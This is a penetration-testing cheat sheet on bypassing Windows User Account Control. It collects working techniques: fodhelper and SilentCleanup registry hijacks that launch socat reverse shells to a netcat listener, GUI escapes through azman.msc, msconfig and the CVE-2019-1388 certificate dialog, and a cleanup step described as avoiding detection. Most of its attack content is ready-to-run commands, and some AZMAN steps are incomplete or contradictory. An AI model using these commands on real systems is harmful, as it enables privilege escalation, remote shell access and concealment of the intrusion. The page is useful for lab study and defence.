# UAC Bypass

UAC (User Account Control) is an access control enforcement feature.

### Automation <a href="#automation" id="automation"></a>

[**UACME**](https://github.com/hfiref0x/UACME) is an automation tool for defeating Windows UAC.

### Cheat Sheets <a href="#cheat-sheets" id="cheat-sheets"></a>

* [uac-bypass-oneliners](https://github.com/blue0x1/uac-bypass-oneliners)

### Investigation <a href="#investigation" id="investigation"></a>

```
# Check the current user's integrity level
whoami /groups | findstr "Label"
whoami /groups | find "Label"
```

### UAC Bypass <a href="#uac-bypass_1" id="uac-bypass_1"></a>

#### AZMAN.MSC (Authorization Manager) <a href="#azmanmsc-authorization-manager" id="azmanmsc-authorization-manager"></a>

1. Open AZMAN.MSC by entering “azman.msc” in the Run.
2. Click Help and select Help Topics. The MMC window will open.
3. In the MMC window, right-click and select View Source. The Notepad opens.
4. In the Notepad, select File → Open.
5. then click Open. Command Prompt will open.
6. In Command Prompt, we should escalate to High integrity level. For instance, try `cd C:\Users\Administrator` command. We may be able to access this directory even if we’re not Administrator.
7. In Explorer, select Windows/System32/cmd.exe and right-click, then select Open.
8. We should escalate to High integrity level.

#### Fodhelper (Features on Demand Helper) <a href="#fodhelper-features-on-demand-helper" id="fodhelper-features-on-demand-helper"></a>

Fodhelper manages the Windows features settings.

First start listener in local machine for getting incoming connection.

```
nc -lvnp 4444
```

In remote Windows machien, add subkey to the registry and execute fodhelper to reverse shell.

```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\socat.exe TCP:<local-ip>:4444 EXEC:cmd.exe,pipes"
# /v: Value name under the selected key.
# /d: Data to assign to the registry ValueName being added.
# /f: Force overwriting the existing registry entry without prompt.
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

We should get a shell and elevate High integrity level.

To check the IL, run the following command.

```
whoami /groups | find "Label"
```

Finally, we need to clear the above settings to avoid detection.

```
# /f: Forces the deletion without prompt
reg delete HKCU\Software\Classes\ms-settings\ /f
```

#### Scheduled Task: Disk Cleanup <a href="#scheduled-task-disk-cleanup" id="scheduled-task-disk-cleanup"></a>

Start listener for getting reverse connection in local machine.

```
nc -lvnp 4444
```

Add the entry to registry to reverse shell.

```
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\socat.exe TCP:<local-ip>:4444 EXEC:cmd.exe,pipes &REM " /f
# /run: Start the scheduled tasks immediately.
# /tn: Task name
# /I: Idle time
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

#### System Configuration (msconfig) <a href="#system-configuration-msconfig" id="system-configuration-msconfig"></a>

1. Open System Configuration by entering **"msconfig"** in the Run.
2. Go to Tools tab and select Command Prompt, then click Launch.
3. We should escalate to High integrity level.

### Abuse UAC Windows Certificate Dialog (CVE-2019-1388) <a href="#abuse-uac-windows-certificate-dialog-cve-2019-1388" id="abuse-uac-windows-certificate-dialog-cve-2019-1388"></a>

UAC Windows Certificate Dialog is vulnerable to privilege escalation.

1. Open **hhupd.exe**. The User Account Control window opens.
2. Click the **"Show more details"** and click also **"Show information about the publisher’s certificate"**.
3. Now click the **"Issued by"** link. Web browser will open.
4. In web browser, select **Tools -> File -> Save as...**.
5.  On the explorer window address path, enter the cmd.exe full path as below:

    **"c:\Windows\System32\cmd.exe"**

Now we escalated the privilege.

### References <a href="#references" id="references"></a>

* [nobodyatall648](https://github.com/nobodyatall648/CVE-2019-1388)
